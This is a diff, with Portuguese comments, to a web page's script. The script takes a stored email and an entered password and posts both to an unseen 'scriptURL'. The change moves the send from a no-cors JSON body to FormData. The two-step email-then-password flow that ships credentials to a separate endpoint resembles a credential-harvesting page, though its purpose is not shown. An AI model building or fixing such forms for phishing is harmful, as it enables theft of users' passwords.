@@ -114,7 +114,6 @@
   </div>
 
   <script>
-    // Pegar o e-mail armazenado
     const email = localStorage.getItem('userEmail') || '';
     const emailText = document.getElementById('emailText');
     emailText.textContent = email || 'Usuário';
@@ -129,25 +128,24 @@
         return;
       }
 
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('senha', senha);
+
       fetch(scriptURL, {
         method: 'POST',
-        mode: 'no-cors',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ email, senha }) // envia corretamente a senha
+        body: formData
       })
       .then(() => alert('Dados enviados com sucesso!'))
       .catch(() => alert('Erro ao enviar os dados.'));
     });
 
-    // Mostrar/ocultar senha sem alterar fonte
     const pwField = document.getElementById('passwordField');
     const toggle = document.getElementById('togglePassword');
     toggle.addEventListener('change', function() {
       const currentFontSize = pwField.style.fontSize || '15px';
       pwField.type = this.checked ? 'text' : 'password';
-      pwField.style.fontSize = currentFontSize; // mantém tamanho da fonte
+      pwField.style.fontSize = currentFontSize;
     });
   </script>
 
